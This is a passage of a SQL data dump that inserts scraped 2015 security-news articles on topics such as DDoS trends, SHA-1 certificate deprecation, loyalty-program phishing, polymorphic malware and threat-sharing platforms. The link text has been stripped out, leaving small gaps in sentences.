the lone hacker, tattooed and wearing a dark hoodie. But for every one of those people putting on a public show, there are tens if not hundreds of people who spend their time  . Many of them are successful businesspeople, wearing a suit to work every day, looking and acting no different from everyone else. To some people, committing crimes using a computer is as much a 9-to-5 job as protecting computer systems is. It’s almost certain that Professor Aiken’s research extends beyond the stereotypes. Unfortunately, what comes out in shows like “CSI: Cyber” and the press is that preconceived notion of a hacker. The idea that it’s a 15-year-old kid in his basement is further reinforced by events like the  , but this type of event is now the outlier and less of a threat than the press makes it seem. The bigger worry is attacks that last for weeks, months and even years, undetected until an external entity calls to notify the victim that they’ve been compromised. Hackers who go unnoticed and undetected aren’t attacking for fun or to fulfill some cyber-sexual urge; they’re attacking because it’s how they make their living, and they’re good at it. We need to see more research into the criminal motivations of the people who are   and businesses around the world. But the model of the lone hacker no more applies to the psychology of modern cybercriminals than the profile of a single serial killer could be generalized to all murderers. We need to broaden the research, move beyond the old model and understand the larger populace of criminal behaviors that happen to involve computers and the Internet. We’ll probably find that it’s not all that different from any other type of crime. Unfortunately, it appears that Aiken won’t be the one to do broader research into computer-related criminals, at least in Ireland. Shortly before her talk at the Web Summit, it was announced that the Royal College of Surgeons Ireland (RSCI), the home of her organization, would be  . It seems that the research being done there no longer aligns with the direction the RCSI believes it needs to take. Hopefully Aiken and the CyberPsychology Research Center can find a new home and broaden their research from the stereotypes and into the real world of cybercriminals. The need for this information won’t be going away any time soon.', '\'Cybercrime\', \'Cybercriminals\', \'DEF CON\', \'Human Psychology\'', 'https://securityintelligence.com/researching-the-psychology-of-hackers/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (328, 'The Outlook of DDoS Threats in 2015', 'Andrew Lemke', '2015-11-30', 'The Panzerhaubitze 2000 is a 155 mm self-propelled howitzer capable of Multiple Rounds Simultaneous Impact (MRSI). Essentially, the artillery shells are fired with different trajectories, but all impact the target concurrently. How is this type of artillery related to denial-of-service attacks? Well, as released in a new research study titled “ ,” it is possible to perform a similar   that uses timing to ensure simultaneous arrival of IP packets. The authors term this temporal lensing and claim it is a potential new class of attack, especially if combined with amplification attacks. Amplification attacks result in the multiplicative creation of new packets in an asymmetric sense. Can you see the lens below? Note that this attack hasn’t yet been seen in the wild. But if history is a teacher, it’s only a matter of time before it does. In April 2015, we witnessed a massive denial-of-service attack against the code-sharing site GitHub via China’s Internet backbone — specifically China Unicom, a major service provider in China. This represented a new class of attack utilizing   and the users of Baidu (the fourth-largest website in the world, as per the  ) to attack Github. Essentially, every visitor to Baidu had JavaScript silently injected into their browser sessions. This resulted in two Web pages being requested from Github for every Baidu visit. Unbeknownst to the users, they were participants in a massive attack against GitHub. This is a powerful new vector. If your infrastructure becomes the target of a large population of Web surfers, you’d better be prepared for the onslaught. Imagine for a moment what would happen if every Google visitor also started hitting your site with traffic. Ouch! You all remember the classic   from the 1990s, right? For those of you not schooled in the basics, this was an attack that relied on amplification of data — in this case, ICMP (for the Smurf attack) and UDP port 7 (for the Fraggle attack). In both instances, the protocol was the underlying weakness. Many computers would respond when only one computer made a small request. As it turns out, we have a new threat vector in the BitTorrent protocol that is being termed  . Again, we have a protocol that allows for the amplification attacks. As described in a recent  , BitTorrent and BTSync protocols can enable DRDoS attacks using an amplification mechanism. Some characteristics of the DRDoS attack vector include the fact that: I hate to present threats without also providing solutions, but in the case of DDoS, it really requires an in-depth consultation to ensure you’ve got your bases covered. Recommendations depend on the threat level for your organization, your risk appetite, your desire to be actively involved, the degree to which you can sustain any downtime, etc. To complete a comprehensive  , the following questions need to be answered: Additionally, some of the following technologies need to be considered as part of your architecture decisions:', '\'Advanced Threats\', \'Threat Intelligence\'', 'https://securityintelligence.com/the-outlook-of-ddos-threats-in-2015/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (329, 'A Kitten and an Information Security Analyst Walk Into a Bar…', 'Pamela Cobb', '2015-11-23', 'So a kitten and an information security analyst walk into a bar… It’s a great setup for a joke, right? (Unless you consider that kittens are way too young to drink and shouldn’t even be in a bar in the first place.) Let us also consider that an information security analyst probably doesn’t have the luxury of time to go to a bar given the year we’ve seen in Internet security, what with ransomware, insider threats and onion-layered attacks running rampant, according to the latest  . The fact of the matter is that the information security analyst might be trying to forget some of the very silly things his colleagues do despite best practice lists and common sense. Let’s dissect some of those bad choices, with the help of our little kitten friend. We’ve all seen those charging stations at conferences, airports and even on airplanes, enticing you to just plug in and relax while devices charge. In the old days, power and data flowed through separate cables, but modern mobile devices require that both charging and data flow through a single cord. Without seeing what’s on the other end of that charging kiosk, plugging your phone in can mean that you are allowing access to the data on your phone and possibly even the injection of malicious code, which is known as juice jacking. To protect yourself, carry a USB charger and plug into an electrical outlet, invest in a USB prophylactic that will allow power flow but block data flow or charge only through a power bank. Nearly 75 percent of cyberattacks use   in commercial software, but only about 10 percent of organizations have the capacity to apply patches on the same day they’re released. Do your best to be part of that 10 percent, for catnip’s sake! There are many wonders to behold on the Internet. Whether it’s an email with a link proclaiming “cutest kitten picture ever!” or a click-bait headline on social media, think before clicking. Do you know the sender of the email? Is the destination site or publication a reputable one? At best, you’ve wasted time clicking through to another weird corner of the Internet, and at worst, you’re clicking through to a malware host for a drive-by download. Think before you click. Do you know why that game app needs access to your contacts? Or why that navigation app wants access to your health data? Be mindful of the permissions you grant to apps on your mobile devices and what   on your behalf. If you’re suspicious of an application and its need for permissions, compare it to others in the same category to see if there’s a consistency for a particular permission type or if it’s an indicator of data gathering for potentially illicit purposes. Password hygiene continues to be problematic and was one of the key factors cited in the X-Force Threat Intelligence Quarterly as contributing to insider threats. Whether it is shared accounts,   or passwords that never expire, this lack of accountability on user provisioning and privileges is leaving major holes in corporate networks. Even with effective termination procedures, having shared admin accounts or unexpired passwords leaves doors open to disgruntled ex-employees if they take advantage of remote administration tools like LogMeIn or TeamViewer before their departure. There’s a certain haughtiness that an information security analyst and others in the industry can adopt in thinking that they are too well-versed in security practices to ever be the victim of an attack. Social engineering has evolved to such levels of sophistication that even the most seasoned practitioner can be fooled. There is no universal security karma that prevents those of us in this industry from being infected, just that poorly defined Alanis Morissette-esque sense of irony when there’s a fly in your chardonnay. To learn more about the top security trends in 2015, download the latest  . You can also watch our on-demand webinar, titled “ ” — kittens not included.', '\'IBM X-Force Research\', \'Information Security\', \'Security Intelligence\', \'Social Engineering\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/a-kitten-and-an-information-security-analyst-walk-into-a-bar/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (330, 'Infographic: The Top Four Cybercrime Trends Are…', 'Michelle Alvarez', '2015-11-18', 'Would you seek medical treatment from someone who’s never actually practiced medicine, only studied it? What about take your car to a mechanic who’s never performed a repair? Probably not. You’d most likely feel comfortable only obtaining services from a professional who’s had practical experience in his or her trade. So why would you seek information on the latest cybercrime trends from anyone other than those who have  ? Based on the field experience of consultants responding to security incidents,   identified four key trends in cybersecurity. These trends, highlighted below, are laid out in a new infographic, “ ,” along with indicators that might show you are at risk.   Investigating one event reveals an older, often significantly more damaging hidden attack. Of all the incidents the ERS team encountered, these complex situations were the most demanding of investigative time and resources to ascertain the facts, find the root causes, develop a timeline of events and provide the client with recommendations on how to resolve the issues that allowed the attackers to get into the network.  is big business for cybercriminals, who can now hold data hostage via encryption. ERS estimated that the paths of ransomware infections are primarily unpatched vulnerabilities (No. 1), drive-by downloads (No. 2) and spear phishing emails (No. 3). A disgruntled ex-employee can wreak havoc for a long time by setting up access to resources before walking out the door. Even worse, you may be leaving the door   for their malicious activity. The pattern that emerged showed that administrative user accountability often goes unenforced. Want some good news? High-profile breaches have increased interest in cybercrime prevention at the management and even board level. This interest from people in positions of oversight can provide a forum for   who need top-level support for needed initiatives. Is your organization taking the right steps to protect itself? View the infographic to find out the warning signs that indicate you could be vulnerable to this year’s top threat types. It also provides a view of the questions top management is asking about security programs.', '\'Cybercrime\', \'Ransomware\', \'Security Awareness\', \'Spear Phishing\'', 'https://securityintelligence.com/infographic-the-top-four-cybercrime-trends/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (331, 'A SHA-1 Certificate Will Fail Soon', 'Larry Loeb', '2015-11-18', 'First published in 1995, SHA-1 is one of the cryptographic hash algorithms used to verify the certificates used by websites to prove that they are who they say they are. But it has a problem today: The assumptions made long ago as to its mathematical resistance to attacks have been overcome by cheaper, faster computing power. Now, a SHA-1 certificate just does not provide the   it was once thought to.\n  are supposed to give unique outputs for unique inputs. However, there is   showing a method of collision attack that could give the same output for two differing inputs, which means an attacker could spoof a browser by forging a signature. That’s not good for software downloads, banking transactions or any other Web process that needs to know — via the certificate mechanism — to whom it is talking.\n This problem has been obvious, if not acute, for a while. The National Institute of Standards and Technology (NIST) banned use of SHA-1 for new certificate signature generation after the end of December 2013. The newer SHA-2, which has double the bits — 256 compared to 128 — of hashing, was strongly pushed. By May 2015, there were more SHA-2 certificates in use than the legacy SHA-1 certs. But many certificates still use SHA-1, and some of them are issued for a period extending beyond the beginning of 2017.\n That date matters because browser manufacturers have provisionally decided to stop accepting SHA-1 certs as valid after January 2017. But given the new information on how much simpler cracking SHA-1 is than was previously thought, they may have to move sooner than that.   announced in late October that is was trying to advance the cutoff date to July 2016.   is also considering stopping the trust of SHA-1 signed certs as of June 2016.\n Internet services company   said there are over 1 million SHA-1 certs still being used. There may be a very simple reason for this situation: Users in less developed countries do not have the software or hardware to process SHA-2 certificates. Windows XP SP2 and earlier, as well as Android 2.2 and earlier, can’t handle SHA-2.\n While these operating systems are no longer distributed, they still remain in wide use. This means that there could be as many as 70 million users that would be locked out of a site using SHA-2.\n Mozilla already  : The company reckons that it killed 1 million downloads by switching to a SHA-2 cert on its site. As the organization put it, “A lot of the world is still running old browsers.” It had to reissue a SHA-1 certificate that expires at the end of 2015 as a temporary solution.\n Dealing with   is never easy or simple; resolving this situation will be neither. But assuring the majority of Web users use a working privacy system is too important an issue not to pursue with vigor.', '\'Browser Security\', \'Certificate Authority (CA)\', \'Cybersecurity\', \'Legacy Applications\', \'Mozilla\', \'National Institute of Standards and Technology (NIST)\', \'SHA-1\'', 'https://securityintelligence.com/a-sha-1-certificate-will-fail-soon/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (332, 'A Look Back With IBM X-Force: Lessons Learned From Security Research in 2015', 'Michelle Alvarez', '2015-11-17', 'This year has flown by! It seems like just yesterday IBM was presenting “ ” at the InterConnect Conference. Aside from good holiday cheer, the end of the year is often a time when one reflects on past events and lessons learned. For this reason, the final issue of the 2015   shifts the focus to our in-house experts at IBM Security Services and their recent security research. The IBM Security Services team has an extensive global reach and experience with addressing cybersecurity concerns and incidents affecting clients across a broad range of industries. Insights garnered from these experiences allow the team to identify common threads, which are woven together to form a picture of current security trends, techniques and tools used by cybercriminals, as well as reoccurring gaps in our clients’ security postures. Many of the security incidents to which the   team responds involve fundamental breakdowns in sound security practices — that is, they could be prevented. While the incidents occur around the globe, many of them share certain characteristics and fit recurring patterns. Our report begins by highlighting four key trends the ERS team has observed throughout 2015. These include an increase in onion-layered security incidents,   and insider threats, along with the transformation of security issues into a boardroom priority. These security trends raise an important question: How can your enterprise find the footprints that attackers leave behind when they breach your defenses? Fortunately, the attackers aren’t the only ones who have a collection of tools at their disposal. Our second article addresses  , which provide the digital evidence that an attack may have occurred and are an important tool in forensic analysis following a breach. We focus on how security teams can use IoC to track advanced attackers, assess the level of compromise and remediate issues before significant damage occurs. It’s been a tough year for our customers’ security teams. Insider threats, malware, stealthy tools and morphing attacks continue to challenge organizations of all sizes in 2015. When IBM X-Force looks back across the year, we see many areas for improvement. The good news is that organizations can use this security research to take stronger responsibility, make a few small changes and see a big impact for the long term.', '\'IBM X-Force Research\', \'Indicator of Compromise (IoC)\', \'Ransomware\', \'Threat Intelligence\', \'X-Force\', \'X-Force Threat Intelligence Quarterly\'', 'https://securityintelligence.com/a-look-back-with-ibm-x-force-lessons-learned-from-security-research-in-2015/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (333, 'Cybercriminals Phish Their Way Into Customer Loyalty Programs', 'Michelle Alvarez', '2015-11-9', 'Scenario: A financial corporation’s customer service center is inundated with calls in a short period regarding customers receiving notifications that their email address and password had been changed. The customers insist they were not the ones to update their profiles, and upon checking the accounts, the service specialists determine the customers’ rewards balances have been depleted. An emergency response services (ERS) team is called in to investigate, and they find that, fortunately, the integrity of the server was not compromised. Account credential misuse, however, is confirmed — mostly likely due to cybercriminals who compromised accounts with large loyalty card balances and sold them on the  . The ERS team found that the Web application allowed attackers to access account credentials by incrementing an ID in the URL, guessing simple passwords or exploiting account users’ reuse of passwords from other compromised sites. This scenario is hypothetical, but cases like it are increasing in frequency. Many companies, including retailers, airlines, hotel chains and financial services, offer a loyalty or rewards program to provide an incentive to customers to make purchases from them and remain loyal to their brand. Loyalty or rewards points can be regarded by consumers as another form of currency. That makes these accounts an attractive target for cybercriminals and has led to   in the past year. When a customer’s points are compromised, it’s viewed as a direct hit to finances. Therefore, it is important for organizations that offer these programs to identify the root causes of these compromises and, more importantly, determine what they can do to help minimize the chance of their customers’ hard-earned loyalty points being stolen. \n A very high percentage of attacks are facilitated via phishing and spear phishing.   are not immune to these tactics. With an abundance of personal data on the Internet, it is trivial for an attacker to build a pretty accurate profile of a target in a short period. Job title and shopping preferences could be used to craft the perfect phishing email that unsuspecting victims will assume is legitimate. \n An attacker could further doctor up the email above by including a weaponized document designed to exploit application vulnerabilities and perform a drive-by download. This results in malware infection. The attacker can then activate keylogging functionality to capture the users’ login credentials, exfiltrate information or further map out the network and infect other endpoints. An alternative would be to include a link to a phishing page that mimics the look and feel of a legitimate website.\n U.S. consumers hold   in customer loyalty programs, according to one 2015 study. Rewards programs are widely used across numerous industries. Following a breach, the very thing that these programs aim to achieve — loyalty — is broken. Reputation is tarnished, which costs organizations money to restore. There is also a financial cost associated with reimbursing customers whose points have been stolen and spent. All of these are reasons for organizations to want to focus on applying   to these programs.', '\'Cybercrime\', \'Dark Web\', \'Data Breach\', \'Data Protection\', \'Phishing\', \'Phishing Emails\', \'Spear Phishing\'', 'https://securityintelligence.com/cybercriminals-phish-their-way-into-customer-loyalty-programs/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (334, 'Factorization Machines: A New Way of Looking at Machine Learning', 'Brad Harris', '2015-11-5', 'In 2010, Steffen Rendle, currently a senior research scientist at Google, introduced a   in the world of machine learning. In this work, Rendle described a concept known as a factorization machine. Many years have passed since such an impactful algorithm has been introduced in the world of machine learning.\n Deep learning has become a popular topic, but the idea behind it has been understood for years. However, only now do we have the computational power to execute its more theoretical aspects. In this post, I will examine something brand new in this sphere.\n Factorization machines can be compared to support vector machines (SVMs) with a polynomial kernel, according to  . This algorithm has been well-studied and evaluated. The interesting thing behind support vector machines is that they are still somewhat of a mystery. They are often verified empirically rather than against a theoretical baseline or limit. Even so, they are widely used as general predictors. SVMs define a multidimensional hyperplane, which learns the shape of the curve of the data.\n However, SVMs have known weaknesses, some of which are addressed by Rendle’s factorization machines. For example, they require that the output model contain support vectors, which are training examples that help the algorithm define the shape of the hyperplane as well as other parameters such as the margin for prediction.\n SVMs function best on dense   — that is, data with few to no missing values and data whose plotted points fall near each other. Finally, in SVMs, the input variables are still independent variables even though the polynomial kernel attempts to model the interaction among the variables. This is computed in polynomial time based upon the number of dimensions in the input data as well as the order of the polynomial (e.g., quadratic, cubic or quartic).\n Factorization machines were designed to address these weaknesses. Firstly, no training examples are required in the model parameters, making the models much more compact. Factorization machines perform extremely well on sparse data, including data of very high sparsity. As a trade-off, they do not perform well on dense data, so   are more suited to this class of data.\n Finally, and perhaps most amazing of all, factorization machines can model  -way variable interactions, where   is the number of polynomial order. Note that in all current implementations, the order has been fixed at two. While the equations generalize to higher orders, there are some issues such as the numerical stability of the optimization methods that have prevented the generalization of  .\n Rendle ingeniously proposed a method of reducing the polynomial computation time to linear complexity. It is this capability of factorization machines that makes them extremely attractive to researchers.\n Additionally, Rendle demonstrates that, through proper feature engineering, the machines can mimic the best specialized factorization models developed for very specific situations. This allows them to be applied in a multitude of situations where a specific form of learning algorithm and predictor are required.\n In his original paper, Rendle discussed a method of optimization for the model parameters known as stochastic gradient descent, which works well with several loss functions. However, the optimization algorithm is extremely dependent on the learning rate, one of the hyperparameters of the method. If the learning rate is too high, the model parameters will not converge, while if it is too low, the algorithm is no longer time-efficient.\n Because of this, Rendle reviewed three more methods of optimization in “ ,” known as alternating least-squares, marcov chain monte carlo inference and adaptive stochastic gradient descent. He recommends marcov chain monte carlo inference because there are fewer hyperparameters, and those that must be specified are not as sensitive to their initial values.\n Factorization machines have been widely applied in the field of collaborative recommendation systems, where their sparse predictive power and ability to mimic state-of-the-art, specific factorization methods make them generalizable to several tasks. Not only are they used in recommending movies and music, for example, but researchers have even applied them to use social media to   with surprisingly positive results.\n As I discussed above, factorization machines can function as general predictors akin to support vector machines in high-dimensional sparse data. While they are not commonly used outside of recommendation systems at present, they have the potential to become classifiers similar to SVMs.\n There are several implementations of factorization machines. The state-of-the-art continues to be  , created by Rendle himself. However, there are other interesting implementations such as  . There’s even a version of libFM designed for the Spark framework, known as  , that allows factorization machines to be parallelized.\n Factorization machines are just now being studied rigorously, but they hold great promise in the world of sparse predictors, especially when pairwise interaction of variables is useful and linear complexity with polynomial results is desired. I suspect that soon, as these machines are studied in the realm of general prediction, they will become a critical tool in the  .', '\'Analytics\', \'Data Science\', \'Machine Learning\', \'Security Intelligence\'', 'https://securityintelligence.com/factorization-machines-a-new-way-of-looking-at-machine-learning/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (335, 'The Changing Browser Add-on Security Model', 'David Strom', '2015-10-30', 'With the latest release of   that include Microsoft’s Edge and new versions of Chrome and Firefox, software-makers are moving away from the older browser add-on architecture developed in the early days when Netscape walked among us. Back then, browsers were relatively simple pieces of software. While exploits such as   were first seen in the late 1990s, it took some time before they became popular attack vectors. During that time, developers wrote add-ons to provide extra functionality to these early browsers, but they sometimes  .\n To stem the tide of security problems, browser-makers have had to toss aside the older browser add-on models and force the market to evolve.   actually sports two different browsers: Microsoft has its new Edge browser, which doesn’t support any plugins whatsoever, and it includes a copy of Internet Explorer (IE) for those times when pages require the older architecture. This could be a nightmare for end users who get confused about which browser to run for their particular websites.\n The current versions of both Google Chrome and Mozilla Firefox — versions 45 and 41, respectively — no longer support the older browser plugin standard called Netscape Plugin Application Programming Interface (NPAPI). This is mainly because of security issues, but also because these and other major browser-makers are incorporating technologies previously found in plugins into their main browser engines both to leverage performance and to make them more secure.\n Browser add-ons had three major issues. First, they had access to the entire browser session, so they couldn’t be sandboxed and protected. They represented large targets of cyberattack opportunities since every user had the same version of Flash or Java. They also were less stable than the main browser code themselves. As one post on   stated, “Plugins are still necessary for the moment, but they’re on their way out. They were very useful at one time, but we’re moving beyond them.”\n Note that while browser plugins are going away, browser extensions are still with us and are a completely different beast. Both Firefox and Chrome have thriving extension ecosystems that are used to add various functions and software integrations, and Internet Explorer has its own ecosystem called Browser Helper Objects (BHO). For example, there are integrations for popular cloud-based file repositories like Dropbox and Evernote that take the form of browser extensions, allowing users to move files quickly into a browser context.\n Browser-makers are trying to bring some discipline to their extension partners. Some are starting to implement process isolation to better protect users, along with code signing policies. “The consequence of these changes are that existing add-ons will have to be reengineered and some may not make it through the approvals process, which will not please users who rely on rejected add-ons,” Mark Gibbs wrote in  .\n Finally, some website operators are approaching the browser security issue by trying to prohibit Adobe Flash-based pages and advertisements. Amazon was the latest Internet conglomerate to make this  . It isn’t exactly a new trend: Ever since Apple’s iPad came out with no Flash support, organizations (even Netflix, which has used Microsoft Silverlight up until now) have been trying to build websites with HTML v5 support.\n But it is noteworthy that Flash still lingers on despite the numerous security challenges. Perhaps this year we will finally see HTML v5 finally take off for enterprise developers — the standards, tools and performance are finally all in place for this more secure version of HTML, as Al Hilwa wrote in the  .\n \n So how should enterprise developers and security managers handle these latest developments? First, if you have corporate Flash-based apps, now is the time to move them to HTML v5. Second, start looking at rigorous ways to screen and upgrade your browser population to the latest versions.\n While the browser-makers seemingly release new versions weekly, at least make an attempt to bring your users to a version that is more recent. This will improve your security posture and, in the long run, could save you from potential exploits. You should also look at the new programming interfaces from Firefox and Chrome to see if they can be useful to your custom-built apps.', '\'Browser Security\', \'Cybersecurity\', \'Firefox\', \'Google Chrome\', \'Internet Explorer (IE)\', \'Microsoft\', \'Windows 10\'', 'https://securityintelligence.com/the-changing-browser-add-on-security-model/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (336, 'Maximizing Effectiveness of Your Application Security Testing Program With Cognitive Intelligent Finding Analytics', 'Kris Duer', '2015-10-27', 'We’ve all been there — that magical time when you have finally automated your application security testing tools to run nightly and are receiving testing results. You breathe a big sigh of relief. Then, when you return to your office the following day, your relief turns to horror as you are inundated with tens or hundreds of thousands of security warnings from the previous night’s scans. Going through all of those alerts one by one to separate the real security issues from the impostors (a process referred to as triage) could take weeks or months of time that you simply don’t have. Now what do you do? It’s a conundrum that we all face: too many security warnings to sort through and not enough time. If you can automate the application security testing, why can’t you automate the triage? How can that be so hard? Enter the savior: Intelligent Finding Analytics (IFA). IFA consists of several technologies utilized over several execution phases. The first phase uses   to think like a security expert. With this baked-in knowledge, IFA can discern between a security warning representing a real vulnerability compared to a potential false positive. Additionally, the machine knows how to prioritize the problems it does find of interest. But it doesn’t end there. The second phase of IFA uses understood and proven heuristics that we have discovered through years of using the security tool in real-world situations. These heuristics are applied to remove uninteresting or false security warnings, further reducing a security analyst’s workload. Of course, we saved the best for last. The final phase of IFA includes what we call Fix Point Analysis. Fix Point Analysis takes the real security warnings that the machine generates during the initial phases of IFA and treats them as symptoms of an overall issue. For example, if your code generates 10 security warnings, and each of those warnings contains tainted data that flows through a common intermediate code block or trace node, we can group those 10 traces on a common node. This capability results in a single overall location in the code where a developer can fix all 10 security warnings at once. This technique uses symptoms (i.e., security warnings) turned into fix-point sets to provide security analysts with the proper context in which they can focus on a single set of fixes at once. Let’s take a look at how IFA can improve your  . Consider John Smith, who works at a fictional company. He has to scan and triage security warnings for more than 60 applications. In addition, he’s tasked with distributing the issues that he finds to be true vulnerabilities to the appropriate developers. The scans in total produce over 160,000 findings. The old way of triaging would be to look through each security warning and identify patterns that indicate whether an issue is real or an impostor. That is a tedious and time-consuming process. Most security scanning tools offer some assistance in the form of filters. But using filters is not automatic; it takes time and effort to set them up. Furthermore, usage of filters must be done through an iterative approach, which can be very inefficient. A solid understanding of general security practices and of the various vulnerabilities found in applications are required for this type of analysis. Now let’s take a look at that same situation, but this time using IFA. John performs the same scans of the same 60 applications. The first and second phases of IFA execute immediately after the scan is completed, resulting in a reduced set of security warnings. In this case, John ends up with 14,000 security warnings for all 60 applications instead of 160,000 — IFA’s removal of false positives and noise resulted in 91 percent fewer warnings! If IFA stopped there, the resulting finding set would be more manageable for him, but it is still difficult and time-consuming to address 14,000 red flags. Fortunately for John, IFA doesn’t stop there. The final phase of IFA groups the resulting security warnings into 300 overall issues (fix points). The real power here is that the 160,000 findings that John started with are now reduced to about 300 issues in total — about five issues per app. More than 98 percent of security warnings have been eliminated. When John returns to the office in the morning, all he has to do is distribute a handful of issues to the developers on each of the application teams, allowing them to focus on the issues that are of highest priority to the organization. All of this processing is performed automatically through IFA, without the need for John to interact with anything. No special security knowledge was required from John and no manual triage steps were required. If you are constantly under pressure to review   testing results more quickly and you feel like you are fighting a losing battle, IFA is something you need to check out. It’s a revolutionary new way of looking at security tool results. It’s not about the problem areas of your code; it’s about finding the most efficient ways to fix your code. It’s as if your friendly neighborhood security expert showed up and did all the work for you, and you still get all the credit. IFA is available as a Static Analyzer feature of IBM’s   offering and has recently been extended to  . You can learn more about IFA’s capabilities by listening to our webinar below, titled  “ .” \n And, to extend your application source code testing knowledge, register for your   of Application Security on Cloud today.', '\'Application Scanning\', \'Application Security\', \'Application Security Testing\', \'Vulnerabilities\'', 'https://securityintelligence.com/maximizing-effectiveness-of-your-application-security-testing-program-with-cognitive-intelligent-finding-analytics/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (337, 'What Is Polymorphic Malware and Why Should I Care?', 'David Strom', '2015-10-16', 'A great deal of modern malware makes use of what is called polymorphic techniques.   defines the term as something that frequently changes attack states or uses different file names, hashes or signatures to encrypt or otherwise hide its code so as to avoid detection and eradication.\n The   may be a new beast, for example, but its inner workings are not entirely unfamiliar. The malware relies on a few tried-and-true Trojan mechanisms from other infamous crimeware codes. It appears that Shifu’s internal makeup was composed by savvy developers who are quite familiar with other banking malware, dressing Shifu with select features from the more nefarious of the bunch.\n In the past, anti-malware programs would scan for particular signatures or simple behaviors. That isn’t good enough anymore, given all the evasive maneuvers that the latest malware writers are using. Take the example of the sophisticated   exploit kit, which targets the vulnerabilities found in plain HTML, JavaScript, Flash and Silverlight and frequently modifies to evade detection. Other infections hide their intent and only show their hand when they decrypt their code and run exploits.\n But now the good guys are turning the tables and employing some of the same kinds of polymorphic evasive techniques as protective measures. This is gaining interest since a number of vendors are using these techniques to keep malware from infecting  . Just as the attackers rely on particular operating system and device weaknesses, the same knowledge can be used to harden these systems.\n The techniques originally were called a “moving target defense” by several academics who held a conference last November in Arizona and   on the subject. Since then, vendors have been working on commercial polymorphic defenses.\n  offered an illustration of how its Botwall service alters the underlying HTML code of a Web page so that it is constantly changing, all with no discernible pattern and lacking the typical coding constructs that one would expect. It shows a simpliﬁed login form, and the software tool replaces certain attributes with random strings. “The resulting code breaks malware, bots or other attacks programmed to submit that form, but renders identically to the original form,” the site stated.\n Other vendors are looking specifically for polymorphic malware by digging deeper into the operating systems that they protect. For example,   can prevent zero-day exploitation attempts, malware deployment and malicious communications from an infected bot. Similarly, a newer tool like   assumes that every malware will be a zero-day entity and looks for typical behaviors such as privilege escalation or running processes from within a browser page as part of its procedures.\n It is still too early to determine if these defensive products can stay ahead of the bad guys. But turnabout is truly fair play, and it is interesting to see these solutions appear in the marketplace.', '\'Advanced Malware\', \'Advanced Threats\', \'Angler\', \'Endpoint Security\', \'Malware\', \'Threat Intelligence\'', 'https://securityintelligence.com/what-is-polymorphic-malware-and-why-should-i-care/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (338, 'The Dyre Trojan and the Art of War', 'Ori Bach', '2015-10-12', 'The immortal words of Chinese military philosopher Sun Tzu were written in an age of sword and steel, but they hold true for modern cyber warfare. As security professionals combat various threats, they must look not only at the tactical abilities of   deployed against them, but also at the strategy of the cyber opponent operating the malware. While tactics such as the malware’s ability to steal sensitive information and avoid detection are fairly easy to observe through technical analysis, understanding an opponent’s strategy requires deeper intelligence and analysis. \n The fraudsters behind the Dyre malware offer a great example of a cyber opponent combining superior tactics with superb strategy. While much has been written about the technical abilities of the   in order to truly assess the nature of the threat, banks must also understand the Dyre fraudsters’ strategy of going after   and constantly penetrating  , all while  . This infographic demonstrates how the fraudsters’ tactics — and the Dyre Trojan — have evolved to serve its strategy.', '\'Cybercrime\', \'Dyre\', \'Dyre Wolf\', \'Financial Fraud\', \'Malware\', \'Security Intelligence\', \'Threat Intelligence\', \'Trojan\'', 'https://securityintelligence.com/the-dyre-trojan-and-the-art-of-war/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (339, 'Comparing Different Tools for Threat Sharing', 'Koen Van Impe', '2015-10-7', 'Collecting threat intelligence data and determining how to process this data is getting more and more attention from security professionals who want to detect and quickly respond to security threats. This holds true not only for advanced persistent threats (APTs), but also for mainstream attacks.\n Threat sharing provides you with information on an existing or emerging threat. This information comes with context, indicators, implications and actionable data. Defining whether or not this threat poses a danger to your environment requires you to know your organization and understand your assets, exposure, employees and business area.\n So where do you get this threat data from? Your view on what is happening, even if you manage multiple environments or networks, is always limited. How do you improve this? The answer is through sharing. Threat sharing increases everyone’s knowledge of adversaries, the assets they are after and how they may try to gain access to your environment.\n Fluent and efficient information sharing can only happen if we agree on a standard.   are community-driven efforts and are also a set of free specifications that help with the automated exchange of cyberthreat information. However, these are just the specifications and not the actual tools that provide a platform for sharing and enriching threat data.\n I took a look at two tools for the sharing of threat intelligence data: MISP and IBM’s X-Force Exchange. Although both tools aim to achieve the same result — sharing data — they use different approaches to achieve that goal.\n , the Malware Information Sharing Platform, needs to be installed on a server in your infrastructure. You need a Web server, database and PHP support with a couple of modules. All of the data is stored on your premises and is under your control. The hardening of the server, securing the access and communication and foreseeing backups and redundancy are your responsibility. Obviously, you fully control what happens with the data.\n On the other hand, IBM’s   is a cloud-based platform. You need an IBM ID to get full access to the available threat data (anonymous access is also possible but with restrictive usage) and only a browser to get started; there’s no need for installing extra software. All the data is stored in the cloud, so you do not have to worry about backups or redundancy.\n The nature and type of data that you want to share will highly influence the type of solution you want to use — or that you are even allowed to use. For example, if you are dealing with sensitive government data, then using a cloud-based solution instead of an on-premises solution might be less preferable and maybe even forbidden by local legislation.\n The distribution of threat information can be limited by the originator by using a   code. This can sound counterproductive toward the claim of sharing as much information as possible, but for certain ongoing incidents, restricting distribution makes sense. You don’t want to risk that attackers can read how your investigation is progressing.\n Starting with your own empty on-premises database (such as with MISP) will limit the amount of immediate accessible and actionable data. On the other hand, by participating in X-Force Exchange, users get immediate access to 700 TB of   on IPs, URLs, Web applications, malware and vulnerabilities.\n A single instance of MISP will start with an empty database. 